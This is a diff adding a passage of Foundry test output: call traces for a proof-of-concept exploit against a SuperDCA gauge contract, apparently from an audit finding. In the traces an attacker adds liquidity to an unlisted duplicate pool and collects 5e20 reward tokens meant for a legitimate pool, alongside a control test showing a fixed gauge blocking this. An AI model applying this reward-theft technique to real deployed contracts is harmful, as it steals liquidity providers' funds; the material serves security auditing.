@@ -1,0 +1,319 @@
+Compiling 21 files with Solc 0.8.27
+Solc 0.8.27 finished in 2.70s
+Compiler run successful!
+warning: invalid natspec tag '@dev:', custom tags must use format '@custom:name'
+   --> test/63420-h-2-attackers-will-steal-rewards-from-legitimate-pools-by-ma.sol:356:9
+    |
+356 |         /// @dev: At this point, there are DCA tokens left in the hook for the other pools.
+    |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+
+
+Ran 2 tests for test/63420-h-2-attackers-will-steal-rewards-from-legitimate-pools-by-ma_exp.sol:SuperDCAGaugeRewardTheftTest
+[PASS] test_control_fixedGaugeBlocksUnlistedPool() (gas: 6169319)
+Traces:
+  [6189219] SuperDCAGaugeRewardTheftTest::test_control_fixedGaugeBlocksUnlistedPool()
+    ├─ [4236699] → new Exploit@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   ├─ [145996] → new DCAToken@0x104fBc016F4bb334D775a19E8A6510109AC63E00
+    │   │   └─ ← [Return] 729 bytes of code
+    │   ├─ [187764] → new MiniToken@0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 0 → 0x55534420436f696e000000000000000000000000000000000000000000000010
+    │   │   │   @ 1: 0 → 0x5553444300000000000000000000000000000000000000000000000000000008
+    │   │   └─ ← [Return] 709 bytes of code
+    │   ├─ [428714] → new MiniPoolManager@0xDDc10602782af652bB913f7bdE1fD82981Db7dd9
+    │   │   └─ ← [Return] 2140 bytes of code
+    │   ├─ [108759] → new MiniSuperDCAStaking@0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773
+    │   │   └─ ← [Return] 543 bytes of code
+    │   ├─ [522445] → new SuperDCAGauge@0xfD07C974e33dd1626640bA3a5acF0418FaacCA7a
+    │   │   ├─  storage changes:
+    │   │   │   @ 1: 0 → 909534
+    │   │   │   @ 0: 0 → 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
+    │   │   └─ ← [Return] 2386 bytes of code
+    │   ├─ [22366] SuperDCAGauge::setStaking(MiniSuperDCAStaking: [0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773])
+    │   │   ├─  storage changes:
+    │   │   │   @ 2: 0 → 0x0000000000000000000000007fdb3132ff7d02d8b9e221c61cc895ce9a4bb773
+    │   │   └─ ← [Return]
+    │   ├─ [22369] MiniSuperDCAStaking::setGauge(SuperDCAGauge: [0xfD07C974e33dd1626640bA3a5acF0418FaacCA7a])
+    │   │   ├─  storage changes:
+    │   │   │   @ 1: 0 → 0x000000000000000000000000fd07c974e33dd1626640ba3a5acf0418faacca7a
+    │   │   └─ ← [Return]
+    │   ├─ [22367] MiniSuperDCAStaking::setMintRate(1000000000000000000 [1e18])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 0 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   │   └─ ← [Stop]
+    │   ├─  storage changes:
+    │   │   @ 1: 0 → 0x000000000000000000000000037eda3adb1198021a9b2e88c22b464fd38db3f3
+    │   │   @ 8: 0 → 0x000000000000000000000000fd07c974e33dd1626640ba3a5acf0418faacca7a
+    │   │   @ 2: 0 → 0x000000000000000000000000ddc10602782af652bb913f7bde1fd82981db7dd9
+    │   │   @ 3: 0 → 0x0000000000000000000000007fdb3132ff7d02d8b9e221c61cc895ce9a4bb773
+    │   │   @ 9: 0 → 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
+    │   │   @ 4: 0 → 0x000000000000000000000000fd07c974e33dd1626640ba3a5acf0418faacca7a
+    │   │   @ 0: 0 → 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
+    │   │   @ 10: 0 → 0x0000000000000000000000007fdb3132ff7d02d8b9e221c61cc895ce9a4bb773
+    │   └─ ← [Return] 12158 bytes of code
+    ├─ [1905730] Exploit::runFixedControl()
+    │   ├─ [145996] → new DCAToken@0xD76ffbd1eFF76C510C3a509fE22864688aC3A588
+    │   │   └─ ← [Return] 729 bytes of code
+    │   ├─ [187764] → new MiniToken@0x4ff05a443250A64a18C68CEdd2122cFDf3872140
+    │   │   ├─  storage changes:
+    │   │   │   @ 1: 0 → 0x5553444300000000000000000000000000000000000000000000000000000008
+    │   │   │   @ 0: 0 → 0x55534420436f696e000000000000000000000000000000000000000000000010
+    │   │   └─ ← [Return] 709 bytes of code
+    │   ├─ [428714] → new MiniPoolManager@0xc98D9175A32ca68C4B83dB84B4707AF82ae37cC4
+    │   │   └─ ← [Return] 2140 bytes of code
+    │   ├─ [108759] → new MiniSuperDCAStaking@0x40b4863C923385D1632d640B097DDeA6EaB92e76
+    │   │   └─ ← [Return] 543 bytes of code
+    │   ├─ [557077] → new SuperDCAGaugeFixed@0x5366ba85D9F7FF951548a0B990E6cc4e56f5A976
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 0 → 0x000000000000000000000000d76ffbd1eff76c510c3a509fe22864688ac3a588
+    │   │   │   @ 1: 0 → 909534
+    │   │   └─ ← [Return] 2559 bytes of code
+    │   ├─ [22366] SuperDCAGaugeFixed::setStaking(MiniSuperDCAStaking: [0x40b4863C923385D1632d640B097DDeA6EaB92e76])
+    │   │   ├─  storage changes:
+    │   │   │   @ 2: 0 → 0x00000000000000000000000040b4863c923385d1632d640b097ddea6eab92e76
+    │   │   └─ ← [Return]
+    │   ├─ [22369] MiniSuperDCAStaking::setGauge(SuperDCAGaugeFixed: [0x5366ba85D9F7FF951548a0B990E6cc4e56f5A976])
+    │   │   ├─  storage changes:
+    │   │   │   @ 1: 0 → 0x0000000000000000000000005366ba85d9f7ff951548a0b990e6cc4e56f5a976
+    │   │   └─ ← [Return]
+    │   ├─ [22449] SuperDCAGaugeFixed::setListedPool(0x352c5ba8f63eaf31212bdc0989c731bd9f765f8ceda66095bb164f66b3a222fc, true)
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x4c7541f5894fbda201343f4f0a47bcb80d89069c2c8f66c181c375138673dce0: 0 → 1
+    │   │   └─ ← [Return]
+    │   ├─ [53383] MiniPoolManager::modifyLiquidityAs(PoolKey({ currency0: 0xD76ffbd1eFF76C510C3a509fE22864688aC3A588, currency1: 0x4ff05a443250A64a18C68CEdd2122cFDf3872140, fee: 8388608 [8.388e6], tickSpacing: 60, hooks: 0x5366ba85D9F7FF951548a0B990E6cc4e56f5A976 }), ModifyLiquidityParams({ tickLower: -60, tickUpper: 60, liquidityDelta: 1000000 [1e6], salt: 0x0000000000000000000000000000000000000000000000000000000000000000 }), 0x, 0x0000000000000000000000000000000000000a11)
+    │   │   ├─ [28219] SuperDCAGaugeFixed::beforeAddLiquidity(0x0000000000000000000000000000000000000a11, PoolKey({ currency0: 0xD76ffbd1eFF76C510C3a509fE22864688aC3A588, currency1: 0x4ff05a443250A64a18C68CEdd2122cFDf3872140, fee: 8388608 [8.388e6], tickSpacing: 60, hooks: 0x5366ba85D9F7FF951548a0B990E6cc4e56f5A976 }), ModifyLiquidityParams({ tickLower: -60, tickUpper: 60, liquidityDelta: 1000000 [1e6], salt: 0x0000000000000000000000000000000000000000000000000000000000000000 }), 0x)
+    │   │   │   ├─ [22374] MiniPoolManager::sync(DCAToken: [0xD76ffbd1eFF76C510C3a509fE22864688aC3A588])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 2: 0 → 0x000000000000000000000000d76ffbd1eff76c510c3a509fe22864688ac3a588
+    │   │   │   │   └─ ← [Return]
+    │   │   │   ├─ [2642] MiniSuperDCAStaking::accrueReward(MiniToken: [0x4ff05a443250A64a18C68CEdd2122cFDf3872140])
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   └─ ← [Return] 0x259982e5
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xfb14cfa16a5fb0bd9b4d6a89f3fc576e03ad529712cde3c3366f9626c43ba7b4: 0 → 0x00000000000000000000000000000000000000000000000000000000000f4240
+    │   │   └─ ← [Return]
+    │   ├─ [28907] MiniPoolManager::modifyLiquidityAs(PoolKey({ currency0: 0xD76ffbd1eFF76C510C3a509fE22864688aC3A588, currency1: 0x4ff05a443250A64a18C68CEdd2122cFDf3872140, fee: 8388608 [8.388e6], tickSpacing: 10, hooks: 0x5366ba85D9F7FF951548a0B990E6cc4e56f5A976 }), ModifyLiquidityParams({ tickLower: -60, tickUpper: 60, liquidityDelta: 1000000 [1e6], salt: 0x0000000000000000000000000000000000000000000000000000000000000000 }), 0x, 0x1111111111111111111111111111111111111111)
+    │   │   ├─ [3743] SuperDCAGaugeFixed::beforeAddLiquidity(0x1111111111111111111111111111111111111111, PoolKey({ currency0: 0xD76ffbd1eFF76C510C3a509fE22864688aC3A588, currency1: 0x4ff05a443250A64a18C68CEdd2122cFDf3872140, fee: 8388608 [8.388e6], tickSpacing: 10, hooks: 0x5366ba85D9F7FF951548a0B990E6cc4e56f5A976 }), ModifyLiquidityParams({ tickLower: -60, tickUpper: 60, liquidityDelta: 1000000 [1e6], salt: 0x0000000000000000000000000000000000000000000000000000000000000000 }), 0x)
+    │   │   │   └─ ← [Return] 0x259982e5
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xd074b543a2b40c181107e99a8c1ecd0ffe8640cf1c1fee377f5da2013886f68e: 0 → 0x00000000000000000000000000000000000000000000000000000000000f4240
+    │   │   └─ ← [Return]
+    │   ├─ [20466] MiniSuperDCAStaking::seedReward(MiniToken: [0x4ff05a443250A64a18C68CEdd2122cFDf3872140], 1000000000000000000000 [1e21])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x5ec63ab48b7c595e714c548afa4c654350facf9c25e7afb81e41da2eb98808ac: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   └─ ← [Stop]
+    │   ├─ [5007] MiniPoolManager::modifyLiquidityAs(PoolKey({ currency0: 0xD76ffbd1eFF76C510C3a509fE22864688aC3A588, currency1: 0x4ff05a443250A64a18C68CEdd2122cFDf3872140, fee: 8388608 [8.388e6], tickSpacing: 10, hooks: 0x5366ba85D9F7FF951548a0B990E6cc4e56f5A976 }), ModifyLiquidityParams({ tickLower: -60, tickUpper: 60, liquidityDelta: 1000000 [1e6], salt: 0x0000000000000000000000000000000000000000000000000000000000000000 }), 0x, 0x1111111111111111111111111111111111111111)
+    │   │   ├─ [1743] SuperDCAGaugeFixed::beforeAddLiquidity(0x1111111111111111111111111111111111111111, PoolKey({ currency0: 0xD76ffbd1eFF76C510C3a509fE22864688aC3A588, currency1: 0x4ff05a443250A64a18C68CEdd2122cFDf3872140, fee: 8388608 [8.388e6], tickSpacing: 10, hooks: 0x5366ba85D9F7FF951548a0B990E6cc4e56f5A976 }), ModifyLiquidityParams({ tickLower: -60, tickUpper: 60, liquidityDelta: 1000000 [1e6], salt: 0x0000000000000000000000000000000000000000000000000000000000000000 }), 0x)
+    │   │   │   └─ ← [Return] 0x259982e5
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xd074b543a2b40c181107e99a8c1ecd0ffe8640cf1c1fee377f5da2013886f68e: 0x00000000000000000000000000000000000000000000000000000000000f4240 → 0x00000000000000000000000000000000000000000000000000000000001e8480
+    │   │   └─ ← [Return]
+    │   ├─ [3435] MiniPoolManager::collect(PoolKey({ currency0: 0xD76ffbd1eFF76C510C3a509fE22864688aC3A588, currency1: 0x4ff05a443250A64a18C68CEdd2122cFDf3872140, fee: 8388608 [8.388e6], tickSpacing: 10, hooks: 0x5366ba85D9F7FF951548a0B990E6cc4e56f5A976 }), 0x1111111111111111111111111111111111111111)
+    │   │   └─ ← [Return] 0
+    │   ├─ [103764] MiniPoolManager::modifyLiquidityAs(PoolKey({ currency0: 0xD76ffbd1eFF76C510C3a509fE22864688aC3A588, currency1: 0x4ff05a443250A64a18C68CEdd2122cFDf3872140, fee: 8388608 [8.388e6], tickSpacing: 60, hooks: 0x5366ba85D9F7FF951548a0B990E6cc4e56f5A976 }), ModifyLiquidityParams({ tickLower: -60, tickUpper: 60, liquidityDelta: 1000000 [1e6], salt: 0x0000000000000000000000000000000000000000000000000000000000000000 }), 0x, 0x0000000000000000000000000000000000000a11)
+    │   │   ├─ [100500] SuperDCAGaugeFixed::beforeAddLiquidity(0x0000000000000000000000000000000000000a11, PoolKey({ currency0: 0xD76ffbd1eFF76C510C3a509fE22864688aC3A588, currency1: 0x4ff05a443250A64a18C68CEdd2122cFDf3872140, fee: 8388608 [8.388e6], tickSpacing: 60, hooks: 0x5366ba85D9F7FF951548a0B990E6cc4e56f5A976 }), ModifyLiquidityParams({ tickLower: -60, tickUpper: 60, liquidityDelta: 1000000 [1e6], salt: 0x0000000000000000000000000000000000000000000000000000000000000000 }), 0x)
+    │   │   │   ├─ [474] MiniPoolManager::sync(DCAToken: [0xD76ffbd1eFF76C510C3a509fE22864688aC3A588])
+    │   │   │   │   └─ ← [Return]
+    │   │   │   ├─ [642] MiniSuperDCAStaking::accrueReward(MiniToken: [0x4ff05a443250A64a18C68CEdd2122cFDf3872140])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x5ec63ab48b7c595e714c548afa4c654350facf9c25e7afb81e41da2eb98808ac: 0x00000000000000000000000000000000000000000000003635c9adc5dea00000 → 0
+    │   │   │   │   └─ ← [Return] 1000000000000000000000 [1e21]
+    │   │   │   ├─ [514] MiniPoolManager::getLiquidity(0x352c5ba8f63eaf31212bdc0989c731bd9f765f8ceda66095bb164f66b3a222fc) [staticcall]
+    │   │   │   │   └─ ← [Return] 1000000 [1e6]
+    │   │   │   ├─ [44678] DCAToken::mint(0x00000000000000000000000000000000000de0DE, 500000000000000000000 [5e20])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0: 0 → 0x00000000000000000000000000000000000000000000001b1ae4d6e2ef500000
+    │   │   │   │   │   @ 0x09d8379754343643dc82e50e9d273917963eb7b390eb2ba7fbb0820d5da1c1f0: 0 → 0x00000000000000000000000000000000000000000000001b1ae4d6e2ef500000
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [22778] DCAToken::mint(MiniPoolManager: [0xc98D9175A32ca68C4B83dB84B4707AF82ae37cC4], 500000000000000000000 [5e20])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xf9db4ad7295c63f5a9b6f2b36bd186b191253b6dadb4be09996f15f8a30dee62: 0 → 0x00000000000000000000000000000000000000000000001b1ae4d6e2ef500000
+    │   │   │   │   │   @ 0: 0x00000000000000000000000000000000000000000000001b1ae4d6e2ef500000 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [23351] MiniPoolManager::donate(PoolKey({ currency0: 0xD76ffbd1eFF76C510C3a509fE22864688aC3A588, currency1: 0x4ff05a443250A64a18C68CEdd2122cFDf3872140, fee: 8388608 [8.388e6], tickSpacing: 60, hooks: 0x5366ba85D9F7FF951548a0B990E6cc4e56f5A976 }), 500000000000000000000 [5e20], 0, 0x)
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x08cac416732cfec539faf5ca62171870f71e6b7bb6c98482fc28bc73530a4e50: 0 → 0x00000000000000000000000000000000000000000000001b1ae4d6e2ef500000
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   ├─ [132] MiniPoolManager::settle()
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   └─ ← [Return] 0x259982e5
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xfb14cfa16a5fb0bd9b4d6a89f3fc576e03ad529712cde3c3366f9626c43ba7b4: 0x00000000000000000000000000000000000000000000000000000000000f4240 → 0x00000000000000000000000000000000000000000000000000000000001e8480
+    │   │   └─ ← [Return]
+    │   ├─ [1263] MiniPoolManager::rewardPotOf(PoolKey({ currency0: 0xD76ffbd1eFF76C510C3a509fE22864688aC3A588, currency1: 0x4ff05a443250A64a18C68CEdd2122cFDf3872140, fee: 8388608 [8.388e6], tickSpacing: 60, hooks: 0x5366ba85D9F7FF951548a0B990E6cc4e56f5A976 })) [staticcall]
+    │   │   └─ ← [Return] 500000000000000000000 [5e20]
+    │   ├─  storage changes:
+    │   │   @ 12: 0 → 0x00000000000000000000000000000000000000000000001b1ae4d6e2ef500000
+    │   └─ ← [Return]
+    ├─ [253] Exploit::fixedAttackerStolen() [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertEq(0, 0, "fixed: attacker steals nothing") [staticcall]
+    │   └─ ← [Return]
+    ├─ [506] Exploit::fixedLegitPot() [staticcall]
+    │   └─ ← [Return] 500000000000000000000 [5e20]
+    ├─ [0] VM::assertEq(500000000000000000000 [5e20], 500000000000000000000 [5e20], "fixed: legit pool receives community share") [staticcall]
+    │   └─ ← [Return]
+    ├─ [506] Exploit::fixedLegitPot() [staticcall]
+    │   └─ ← [Return] 500000000000000000000 [5e20]
+    ├─ [253] Exploit::fixedAttackerStolen() [staticcall]
+    │   └─ ← [Return] 0
+    ├─ [0] VM::assertGt(500000000000000000000 [5e20], 0, "fixed: legit pool out-earns attacker") [staticcall]
+    │   └─ ← [Return]
+    └─ ← [Return]
+
+[PASS] test_exploit_unlistedDuplicatePoolStealsPerTokenReward() (gas: 4522303)
+Traces:
+  [4582003] SuperDCAGaugeRewardTheftTest::test_exploit_unlistedDuplicatePoolStealsPerTokenReward()
+    ├─ [4236699] → new Exploit@0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f
+    │   ├─ [145996] → new DCAToken@0x104fBc016F4bb334D775a19E8A6510109AC63E00
+    │   │   └─ ← [Return] 729 bytes of code
+    │   ├─ [187764] → new MiniToken@0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3
+    │   │   ├─  storage changes:
+    │   │   │   @ 1: 0 → 0x5553444300000000000000000000000000000000000000000000000000000008
+    │   │   │   @ 0: 0 → 0x55534420436f696e000000000000000000000000000000000000000000000010
+    │   │   └─ ← [Return] 709 bytes of code
+    │   ├─ [428714] → new MiniPoolManager@0xDDc10602782af652bB913f7bdE1fD82981Db7dd9
+    │   │   └─ ← [Return] 2140 bytes of code
+    │   ├─ [108759] → new MiniSuperDCAStaking@0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773
+    │   │   └─ ← [Return] 543 bytes of code
+    │   ├─ [522445] → new SuperDCAGauge@0xfD07C974e33dd1626640bA3a5acF0418FaacCA7a
+    │   │   ├─  storage changes:
+    │   │   │   @ 1: 0 → 909534
+    │   │   │   @ 0: 0 → 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
+    │   │   └─ ← [Return] 2386 bytes of code
+    │   ├─ [22366] SuperDCAGauge::setStaking(MiniSuperDCAStaking: [0x7FdB3132Ff7D02d8B9e221c61cC895ce9a4bb773])
+    │   │   ├─  storage changes:
+    │   │   │   @ 2: 0 → 0x0000000000000000000000007fdb3132ff7d02d8b9e221c61cc895ce9a4bb773
+    │   │   └─ ← [Return]
+    │   ├─ [22369] MiniSuperDCAStaking::setGauge(SuperDCAGauge: [0xfD07C974e33dd1626640bA3a5acF0418FaacCA7a])
+    │   │   ├─  storage changes:
+    │   │   │   @ 1: 0 → 0x000000000000000000000000fd07c974e33dd1626640ba3a5acf0418faacca7a
+    │   │   └─ ← [Return]
+    │   ├─ [22367] MiniSuperDCAStaking::setMintRate(1000000000000000000 [1e18])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0: 0 → 0x0000000000000000000000000000000000000000000000000de0b6b3a7640000
+    │   │   └─ ← [Stop]
+    │   ├─  storage changes:
+    │   │   @ 9: 0 → 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
+    │   │   @ 8: 0 → 0x000000000000000000000000fd07c974e33dd1626640ba3a5acf0418faacca7a
+    │   │   @ 0: 0 → 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
+    │   │   @ 1: 0 → 0x000000000000000000000000037eda3adb1198021a9b2e88c22b464fd38db3f3
+    │   │   @ 10: 0 → 0x0000000000000000000000007fdb3132ff7d02d8b9e221c61cc895ce9a4bb773
+    │   │   @ 2: 0 → 0x000000000000000000000000ddc10602782af652bb913f7bde1fd82981db7dd9
+    │   │   @ 3: 0 → 0x0000000000000000000000007fdb3132ff7d02d8b9e221c61cc895ce9a4bb773
+    │   │   @ 4: 0 → 0x000000000000000000000000fd07c974e33dd1626640ba3a5acf0418faacca7a
+    │   └─ ← [Return] 12158 bytes of code
+    ├─ [294325] Exploit::run()
+    │   ├─ [52236] MiniPoolManager::modifyLiquidityAs(PoolKey({ currency0: 0x104fBc016F4bb334D775a19E8A6510109AC63E00, currency1: 0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3, fee: 8388608 [8.388e6], tickSpacing: 60, hooks: 0xfD07C974e33dd1626640bA3a5acF0418FaacCA7a }), ModifyLiquidityParams({ tickLower: -60, tickUpper: 60, liquidityDelta: 1000000 [1e6], salt: 0x0000000000000000000000000000000000000000000000000000000000000000 }), 0x, 0x0000000000000000000000000000000000000a11)
+    │   │   ├─ [27072] SuperDCAGauge::beforeAddLiquidity(0x0000000000000000000000000000000000000a11, PoolKey({ currency0: 0x104fBc016F4bb334D775a19E8A6510109AC63E00, currency1: 0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3, fee: 8388608 [8.388e6], tickSpacing: 60, hooks: 0xfD07C974e33dd1626640bA3a5acF0418FaacCA7a }), ModifyLiquidityParams({ tickLower: -60, tickUpper: 60, liquidityDelta: 1000000 [1e6], salt: 0x0000000000000000000000000000000000000000000000000000000000000000 }), 0x)
+    │   │   │   ├─ [22374] MiniPoolManager::sync(DCAToken: [0x104fBc016F4bb334D775a19E8A6510109AC63E00])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 2: 0 → 0x000000000000000000000000104fbc016f4bb334d775a19e8a6510109ac63e00
+    │   │   │   │   └─ ← [Return]
+    │   │   │   ├─ [2642] MiniSuperDCAStaking::accrueReward(MiniToken: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3])
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   └─ ← [Return] 0x259982e5
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x229b333ea287f05e763505ca469513af779b6dba58581e526dd000a8a7836ede: 0 → 0x00000000000000000000000000000000000000000000000000000000000f4240
+    │   │   └─ ← [Return]
+    │   ├─ [28336] MiniPoolManager::modifyLiquidityAs(PoolKey({ currency0: 0x104fBc016F4bb334D775a19E8A6510109AC63E00, currency1: 0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3, fee: 8388608 [8.388e6], tickSpacing: 10, hooks: 0xfD07C974e33dd1626640bA3a5acF0418FaacCA7a }), ModifyLiquidityParams({ tickLower: -60, tickUpper: 60, liquidityDelta: 1000000 [1e6], salt: 0x0000000000000000000000000000000000000000000000000000000000000000 }), 0x, 0x1111111111111111111111111111111111111111)
+    │   │   ├─ [3172] SuperDCAGauge::beforeAddLiquidity(0x1111111111111111111111111111111111111111, PoolKey({ currency0: 0x104fBc016F4bb334D775a19E8A6510109AC63E00, currency1: 0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3, fee: 8388608 [8.388e6], tickSpacing: 10, hooks: 0xfD07C974e33dd1626640bA3a5acF0418FaacCA7a }), ModifyLiquidityParams({ tickLower: -60, tickUpper: 60, liquidityDelta: 1000000 [1e6], salt: 0x0000000000000000000000000000000000000000000000000000000000000000 }), 0x)
+    │   │   │   ├─ [474] MiniPoolManager::sync(DCAToken: [0x104fBc016F4bb334D775a19E8A6510109AC63E00])
+    │   │   │   │   └─ ← [Return]
+    │   │   │   ├─ [642] MiniSuperDCAStaking::accrueReward(MiniToken: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3])
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   └─ ← [Return] 0x259982e5
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x588a3e4c8e92be8505a605080d935d1f325a72927d4f5d0565efc255571bc887: 0 → 0x00000000000000000000000000000000000000000000000000000000000f4240
+    │   │   └─ ← [Return]
+    │   ├─ [20466] MiniSuperDCAStaking::seedReward(MiniToken: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3], 1000000000000000000000 [1e21])
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x97fca3feca94d4f98c0c60a352ea303423a4ffb93889d8d7bafc2c4d9f53f384: 0 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   └─ ← [Stop]
+    │   ├─ [102553] MiniPoolManager::modifyLiquidityAs(PoolKey({ currency0: 0x104fBc016F4bb334D775a19E8A6510109AC63E00, currency1: 0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3, fee: 8388608 [8.388e6], tickSpacing: 10, hooks: 0xfD07C974e33dd1626640bA3a5acF0418FaacCA7a }), ModifyLiquidityParams({ tickLower: -60, tickUpper: 60, liquidityDelta: 1000000 [1e6], salt: 0x0000000000000000000000000000000000000000000000000000000000000000 }), 0x, 0x1111111111111111111111111111111111111111)
+    │   │   ├─ [99289] SuperDCAGauge::beforeAddLiquidity(0x1111111111111111111111111111111111111111, PoolKey({ currency0: 0x104fBc016F4bb334D775a19E8A6510109AC63E00, currency1: 0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3, fee: 8388608 [8.388e6], tickSpacing: 10, hooks: 0xfD07C974e33dd1626640bA3a5acF0418FaacCA7a }), ModifyLiquidityParams({ tickLower: -60, tickUpper: 60, liquidityDelta: 1000000 [1e6], salt: 0x0000000000000000000000000000000000000000000000000000000000000000 }), 0x)
+    │   │   │   ├─ [474] MiniPoolManager::sync(DCAToken: [0x104fBc016F4bb334D775a19E8A6510109AC63E00])
+    │   │   │   │   └─ ← [Return]
+    │   │   │   ├─ [642] MiniSuperDCAStaking::accrueReward(MiniToken: [0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x97fca3feca94d4f98c0c60a352ea303423a4ffb93889d8d7bafc2c4d9f53f384: 0x00000000000000000000000000000000000000000000003635c9adc5dea00000 → 0
+    │   │   │   │   └─ ← [Return] 1000000000000000000000 [1e21]
+    │   │   │   ├─ [514] MiniPoolManager::getLiquidity(0x5f77bca3b0a8230477aa86045397c748babe75da05512b575adab4373ce781c5) [staticcall]
+    │   │   │   │   └─ ← [Return] 1000000 [1e6]
+    │   │   │   ├─ [44678] DCAToken::mint(0x00000000000000000000000000000000000de0DE, 500000000000000000000 [5e20])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0: 0 → 0x00000000000000000000000000000000000000000000001b1ae4d6e2ef500000
+    │   │   │   │   │   @ 0x09d8379754343643dc82e50e9d273917963eb7b390eb2ba7fbb0820d5da1c1f0: 0 → 0x00000000000000000000000000000000000000000000001b1ae4d6e2ef500000
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [22778] DCAToken::mint(MiniPoolManager: [0xDDc10602782af652bB913f7bdE1fD82981Db7dd9], 500000000000000000000 [5e20])
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0x8b5b6fedba96853f3e741a4dd76edc3c6856e77495496aa737e75ae5b76284f0: 0 → 0x00000000000000000000000000000000000000000000001b1ae4d6e2ef500000
+    │   │   │   │   │   @ 0: 0x00000000000000000000000000000000000000000000001b1ae4d6e2ef500000 → 0x00000000000000000000000000000000000000000000003635c9adc5dea00000
+    │   │   │   │   └─ ← [Stop]
+    │   │   │   ├─ [23351] MiniPoolManager::donate(PoolKey({ currency0: 0x104fBc016F4bb334D775a19E8A6510109AC63E00, currency1: 0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3, fee: 8388608 [8.388e6], tickSpacing: 10, hooks: 0xfD07C974e33dd1626640bA3a5acF0418FaacCA7a }), 500000000000000000000 [5e20], 0, 0x)
+    │   │   │   │   ├─  storage changes:
+    │   │   │   │   │   @ 0xcddd00e321c1085f542b62d692bece337df1d1cb782b09b1c3694be1c6946ead: 0 → 0x00000000000000000000000000000000000000000000001b1ae4d6e2ef500000
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   ├─ [132] MiniPoolManager::settle()
+    │   │   │   │   └─ ← [Return] 0
+    │   │   │   └─ ← [Return] 0x259982e5
+    │   │   ├─  storage changes:
+    │   │   │   @ 0x588a3e4c8e92be8505a605080d935d1f325a72927d4f5d0565efc255571bc887: 0x00000000000000000000000000000000000000000000000000000000000f4240 → 0x00000000000000000000000000000000000000000000000000000000001e8480
+    │   │   └─ ← [Return]
+    │   ├─ [24775] MiniPoolManager::collect(PoolKey({ currency0: 0x104fBc016F4bb334D775a19E8A6510109AC63E00, currency1: 0x037eDa3aDB1198021A9b2e88C22B464fD38db3f3, fee: 8388608 [8.388e6], tickSpacing: 10, hooks: 0xfD07C974e33dd1626640bA3a5acF0418FaacCA7a }), 0x1111111111111111111111111111111111111111)
+    │   │   ├─ [22903] DCAToken::transfer(0x1111111111111111111111111111111111111111, 500000000000000000000 [5e20])
+    │   │   │   ├─  storage changes:
+    │   │   │   │   @ 0x8eec1c9afb183a84aac7003cf8e730bfb6385f6e43761d6425fba4265de3a9eb: 0 → 0x00000000000000000000000000000000000000000000001b1ae4d6e2ef500000
+    │   │   │   │   @ 0x8b5b6fedba96853f3e741a4dd76edc3c6856e77495496aa737e75ae5b76284f0: 0x00000000000000000000000000000000000000000000001b1ae4d6e2ef500000 → 0
+    │   │   │   └─ ← [Return] true
+    │   │   ├─  storage changes:
+    │   │   │   @ 0xcddd00e321c1085f542b62d692bece337df1d1cb782b09b1c3694be1c6946ead: 0x00000000000000000000000000000000000000000000001b1ae4d6e2ef500000 → 0
